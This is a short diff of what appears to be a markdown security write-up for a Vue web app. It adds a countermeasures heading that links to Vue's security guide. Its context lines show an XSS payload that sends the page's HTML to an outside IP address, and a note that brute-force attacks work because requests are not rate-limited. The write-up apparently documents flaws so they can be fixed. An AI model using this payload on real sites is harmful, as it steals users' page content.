@@ -24,6 +24,9 @@ https://www.youtube.com/watch?v=T0vxdqvW9fU&list=LL&index=3
 <script>new Image().src="https://192.165.159.122/fakepg.php?output="+document.body.innerHTML</script>
 ```
 
+## Maßnahmen
+https://v2.vuejs.org/v2/guide/security.html#:~:text=The%20most%20fundamental%20security%20rule%20when%20using%20Vue,during%20server-side%20rendering.%20An%20example%20of%20such%20usage%3A
+
 # Brute-force attack
 Is possible because we do not check how many requests have been sent by one user
 
